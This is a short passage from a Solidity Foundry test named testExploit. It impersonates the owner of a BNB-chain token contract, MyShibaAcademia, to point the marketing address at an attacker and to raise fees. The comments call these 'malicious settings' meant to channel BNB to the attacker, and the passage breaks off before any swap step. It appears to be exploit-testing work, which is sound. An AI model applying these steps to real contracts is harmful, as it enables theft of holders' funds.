    function testExploit() public {
        // Record initial BNB balance of attacker
        uint256 initialBalance = address(attacker).balance;

        // Get owner address
        address owner = MyShibaAcademia(TARGET).owner();

        // Start prank as owner to configure malicious settings
        vm.startPrank(owner);

        // 1. Set marketing address to attacker
        MyShibaAcademia(TARGET).setMarketingAddress(attacker);

        // 2. Enable swap and liquify
        MyShibaAcademia(TARGET).setSwapAndLiquifyEnabled(true);

        // 3. Set moderate fees (10% each = 20% total)
        MyShibaAcademia(TARGET).setTaxFeePercent(10);
        MyShibaAcademia(TARGET).setLiquidityFeePercent(10);

